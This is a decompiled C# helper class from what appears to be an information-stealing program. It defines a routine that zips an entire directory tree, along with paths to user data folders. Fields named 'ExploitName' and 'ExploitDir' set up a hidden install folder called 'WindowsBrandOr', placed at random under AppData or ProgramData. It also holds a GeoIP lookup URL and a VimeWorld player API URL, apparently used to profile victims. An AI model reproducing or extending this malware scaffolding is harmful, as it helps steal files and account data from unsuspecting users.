﻿using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;

namespace SHARP
{
	// Token: 0x0200004A RID: 74
	internal class Help
	{
		// Token: 0x06000154 RID: 340 RVA: 0x00007740 File Offset: 0x00005940
		public static void CreateZipFromDirectory(string sourceDirectory, string targetDirectory, string zipFileName)
		{
			try
			{
				if (!Directory.Exists(sourceDirectory))
				{
					Console.WriteLine("Указанная папка не существует.");
				}
				else
				{
					if (!Directory.Exists(targetDirectory))
					{
						Directory.CreateDirectory(targetDirectory);
					}
					string path = Path.Combine(targetDirectory, zipFileName);
					if (File.Exists(path))
					{
						Console.WriteLine("Архив с таким именем уже существует. Перезаписать? (y/n)");
						if (Console.ReadLine().ToLower() != "y")
						{
							return;
						}
					}
					using (FileStream fileStream = new FileStream(path, FileMode.Create))
					{
						using (ZipArchive zipArchive = new ZipArchive(fileStream, ZipArchiveMode.Create))
						{
							foreach (FileInfo fileInfo in new DirectoryInfo(sourceDirectory).GetFiles("*.*", SearchOption.AllDirectories))
							{
								string entryName = fileInfo.FullName.Substring(sourceDirectory.Length + 1);
								ZipArchiveEntry zipArchiveEntry = zipArchive.CreateEntry(entryName);
								using (FileStream fileStream2 = new FileStream(fileInfo.FullName, FileMode.Open))
								{
									using (Stream stream = zipArchiveEntry.Open())
									{
										fileStream2.CopyTo(stream);
									}
								}
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("Ошибка при создании архива: " + ex.Message);
			}
		}

		// Token: 0x040000D0 RID: 208
		public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

		// Token: 0x040000D1 RID: 209
		public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x040000D2 RID: 210
		public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);

		// Token: 0x040000D3 RID: 211
		public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x040000D4 RID: 212
		public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

		// Token: 0x040000D5 RID: 213
		public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

		// Token: 0x040000D6 RID: 214
		public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

		// Token: 0x040000D7 RID: 215
		public static readonly string ExploitName = Assembly.GetExecutingAssembly().Location;

		// Token: 0x040000D8 RID: 216
		public static readonly string ExploitDirectory = Path.GetDirectoryName(Help.ExploitName);

		// Token: 0x040000D9 RID: 217
		public static string[] SysPatch = new string[]
		{
			Help.AppData,
			Help.LocalData,
			Help.CommonData
		};

		// Token: 0x040000DA RID: 218
		public static string zxczxczxc = Help.SysPatch[new Random().Next(0, Help.SysPatch.Length)];

		// Token: 0x040000DB RID: 219
		public static string ExploitDir = Help.zxczxczxc + "\\WindowsBrandOr";

		// Token: 0x040000DC RID: 220
		public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm");

		// Token: 0x040000DD RID: 221
		public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy");

		// Token: 0x040000DE RID: 222
		public static string VimeAPI = "https://api.vimeworld.ru/user/name/";

		// Token: 0x040000DF RID: 223
		public static string GeoIP = "https://freegeoip.app/xml/";

		// Token: 0x040000E0 RID: 224
		public static bool check = true;
	}
}
